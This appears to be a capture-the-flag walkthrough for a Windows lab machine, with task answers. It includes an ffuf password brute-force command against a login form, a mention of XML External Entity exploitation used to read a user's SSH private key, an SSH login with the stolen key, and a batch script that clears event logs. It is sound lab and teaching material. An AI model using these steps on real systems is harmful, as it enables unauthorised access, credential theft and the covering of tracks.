#### Task 1: What version of Apache is running on the target's port 80?
```html
80/tcp  open  http     Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.2.28)
|_http-server-header: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.2.28
```
Answer: **2.4.41**
#### Task 2: What username:password combination logs in successfully?
```html
ffuf -w /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt -X POST -d "username=admin&password=FUZZ" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.129.25.141/ -H "Cookie: PHPSESSID=3chdskik276u1frrs362of9otv" -fc 401,403,404 -fs 66

:: Progress: [1/10000] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errorpassword                [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 29ms]
```
Answer: **admin:password**
#### Task 3: What is the word at the top of the page that accepts user input?
```html
<img width="898" height="516" alt="image" src="https://github.com/user-attachments/assets/e351d279-8071-462b-8b00-07f1a6429599" />

```
Answer: **Order**
#### Task 4: What XML version is used on the target?
when we send a query using the "Order" tab, we receive a version in response
```html
<?xml version = "1.0"?>
```
Answer: **1.0**
#### Task 5: What does the XXE / XEE attack acronym stand for?

Answer: **XML External Entity**
#### Task 6: What username can we find on the webpage's HTML code?
```html
<!-- Modified by Daniel : UI-Fix-9092-->
```
Answer: **Daniel**
#### Task 7: What is the file located in the Log-Management folder on the target?
after searching user daniel's folder in .ssh/id_rsa I found the ssh key
Then:
```html
ssh -i /tmp/daniel_id_rsa daniel@<target_ip>
```
```html
Directory of C:\

03/12/2020  03:56 AM    <DIR>          Log-Management
```
Listing:
```html
cd Log-Management
dir
```
Output:
```html
03/06/2020  02:42 AM               346 job.bat
```
Answer:**job.bat**

#### Task 8: What executable is mentioned in the file mentioned before?
```html
daniel@MARKUP C:\Log-Management>more job.bat
@echo off
FOR /F "tokens=1,2*" %%V IN ('bcdedit') DO SET adminTest=%%V
IF (%adminTest%)==(Access) goto noAdmin
for /F "tokens=*" %%G in ('wevtutil.exe el') DO (call :do_clear "%%G")
echo.
echo Event Logs have been cleared!
goto theEnd
:do_clear
wevtutil.exe
```
Answer: **wevtutil.exe**
